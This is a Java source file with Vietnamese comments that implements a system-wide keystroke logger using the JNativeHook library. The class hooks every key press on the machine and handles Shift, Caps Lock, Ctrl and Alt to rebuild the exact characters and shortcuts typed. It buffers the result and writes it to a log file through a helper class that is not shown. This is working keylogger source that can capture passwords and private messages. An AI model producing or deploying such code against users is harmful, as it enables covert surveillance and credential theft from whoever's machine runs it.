import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

class KeyListenerHandler implements NativeKeyListener {
    private final StringBuilder keyBuffer = new StringBuilder(); // Bộ đệm lưu các phím nhấn
    private boolean shiftPressed = false; // Kiểm tra phím Shift
    private boolean capsLockEnabled = false; // Kiểm tra Caps Lock
    private boolean ctrlPressed = false; // Kiểm tra phím Ctr
    private boolean altPressed = false; // Kiểm tra phím Alt

    public String flushKeyBuffer() {
        String keys = keyBuffer.toString();
        keyBuffer.setLength(0);
        return keys;
    }

    public void appendToBuffer(String text) {
        keyBuffer.append(text);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = true;
        } else if (keyCode == NativeKeyEvent.VC_CAPS_LOCK) {
            capsLockEnabled = !capsLockEnabled;
        } else if (keyCode == NativeKeyEvent.VC_CONTROL) {
            ctrlPressed = true;
        } else if (keyCode == NativeKeyEvent.VC_ALT) {
            altPressed = true;
        }
        if (ctrlPressed) {
            switch (keyCode) {
                case NativeKeyEvent.VC_C -> keyBuffer.append("[Ctrl+C]");
                case NativeKeyEvent.VC_V -> keyBuffer.append("[Ctrl+V]");
                case NativeKeyEvent.VC_F -> keyBuffer.append("[Ctrl+F]");
                case NativeKeyEvent.VC_S -> keyBuffer.append("[Ctrl+S]");
                case NativeKeyEvent.VC_X -> keyBuffer.append("[Ctrl+X]");
            }
        } else if (altPressed) {
            switch (keyCode) {
                case NativeKeyEvent.VC_TAB -> keyBuffer.append("[Alt+Tab]");
                case NativeKeyEvent.VC_F4 -> keyBuffer.append("[Alt+F4");
            }
        } else {
            switch (keyCode) {
                case NativeKeyEvent.VC_BACKSPACE -> keyBuffer.append("[Backspace]");
                case NativeKeyEvent.VC_DELETE -> keyBuffer.append("[Delete]");
                case NativeKeyEvent.VC_ENTER -> keyBuffer.append("[Enter]");
                case NativeKeyEvent.VC_TAB -> keyBuffer.append("[Tab]");
                case NativeKeyEvent.VC_META -> keyBuffer.append("[Win]");
                case NativeKeyEvent.VC_LEFT -> keyBuffer.append("[Left]");
                case NativeKeyEvent.VC_RIGHT -> keyBuffer.append("[Right]");
                case NativeKeyEvent.VC_UP -> keyBuffer.append("[Up]");
                case NativeKeyEvent.VC_DOWN -> keyBuffer.append("[Down]");
                case NativeKeyEvent.VC_MINUS -> keyBuffer.append(shiftPressed ? '_' : '-');
                case NativeKeyEvent.VC_EQUALS -> keyBuffer.append(shiftPressed ? '+' : '=');
                case NativeKeyEvent.VC_OPEN_BRACKET -> keyBuffer.append(shiftPressed ? '{' : '[');
                case NativeKeyEvent.VC_CLOSE_BRACKET -> keyBuffer.append(shiftPressed ? '}' : ']');
                case NativeKeyEvent.VC_BACK_SLASH -> keyBuffer.append(shiftPressed ? '|' : '\\');
                case NativeKeyEvent.VC_SEMICOLON -> keyBuffer.append(shiftPressed ? ':' : ';');
                case NativeKeyEvent.VC_QUOTE -> keyBuffer.append(shiftPressed ? '"' : '\'');
                case NativeKeyEvent.VC_COMMA -> keyBuffer.append(shiftPressed ? '<' : ',');
                case NativeKeyEvent.VC_PERIOD -> keyBuffer.append(shiftPressed ? '>' : '.');
                case NativeKeyEvent.VC_SLASH -> keyBuffer.append(shiftPressed ? '?' : '/');
                case NativeKeyEvent.VC_BACKQUOTE -> keyBuffer.append(shiftPressed ? '~' : '`');
                default -> processKeyCharacter(keyCode);
            }
        }
        if (keyBuffer.length() > 1000) {
            LogFileHandler.writeToFile(flushKeyBuffer());
        }
    }

    private void processKeyCharacter(int keyCode) {
        String keyText = NativeKeyEvent.getKeyText(keyCode);
        if (keyText.length() == 1) { // Xử lý chỉ với ký tự đơn
            char keyChar = keyText.charAt(0);
            if (Character.isLetter(keyChar)) {
                if ((shiftPressed && !capsLockEnabled)
                        || (!shiftPressed && capsLockEnabled)) {
                    keyChar = Character.toUpperCase(keyChar);
                } else {
                    keyChar = Character.toLowerCase(keyChar);
                }
            } else if (shiftPressed) {
                keyChar = mapSpecialCharacterWithShift(keyChar);
            }
            keyBuffer.append(keyChar); // Chèn ký tự vào bộ đệm
        } else if (keyCode == NativeKeyEvent.VC_SPACE) {
            keyBuffer.append(' '); // Chèn dấu cách
        }
    }

    private char mapSpecialCharacterWithShift(char keyChar) {
        return switch (keyChar) {
            case '1' -> '!'; case '2' -> '@'; case '3' -> '#'; case '4' -> '$';
            case '5' -> '%'; case '6' -> '^'; case '7' -> '&'; case '8' -> '*';
            case '9' -> '('; case '0' -> ')'; default -> 0;
        };
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = false;
        } else if (keyCode == NativeKeyEvent.VC_CONTROL) {
            ctrlPressed = false;
        } else if (keyCode == NativeKeyEvent.VC_ALT) {
            altPressed = false;
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {}
}